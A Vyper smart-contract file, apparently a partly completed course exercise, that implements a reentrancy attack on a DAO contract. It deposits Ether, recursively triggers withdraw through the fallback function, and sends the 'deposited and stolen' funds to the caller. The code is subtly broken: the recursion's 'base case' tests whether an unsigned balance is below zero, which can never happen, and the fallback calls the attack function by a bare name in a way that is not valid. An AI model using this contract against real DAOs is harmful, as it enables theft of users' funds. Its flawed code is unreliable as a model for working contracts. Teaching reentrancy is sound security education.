interface DAO:
    def deposit() -> bool: payable
    def withdraw() -> bool: nonpayable
    def userBalances(addr: address) -> uint256: view

dao_address: public(address)
owner_address: public(address)
is_attack: public(bool)

@external
def __init__():
    self.dao_address = ZERO_ADDRESS
    self.owner_address = ZERO_ADDRESS

@internal
def _attack() -> bool:
    assert self.dao_address != ZERO_ADDRESS
    
    # TODO: Use the DAO interface to withdraw funds.
    # Make sure you add a "base case" to end the recursion
    if(self.dao_address.balance < 0):
        return False
    DAO(self.dao_address).withdraw()

    return True

@external
@payable
def attack(dao_address:address):
    self.dao_address = dao_address
    deposit_amount: uint256 = msg.value    
 
    # Attack cannot withdraw more than what exists in the DAO
    if dao_address.balance < msg.value:
        deposit_amount = dao_address.balance
    
    # TODO: make the deposit into the DAO
    DAO(dao_address).deposit(value=deposit_amount)
    
    self.is_attack = True
    # TODO: Start the reentrance attack
    if(self.is_attack == True):
        #_attack = false
        self._attack()

    # TODO: After the recursion has finished, send all funds (deposited and stolen) to the sender
    send(msg.sender, self.balance)
    
    pass

@external
@payable
def __default__():
    # This method gets invoked when Eth is sent to this contract's address (ie when Withdraw is called)
    
    # TODO: Add code here to complete the recursive call
    attack(dao_address)

    pass
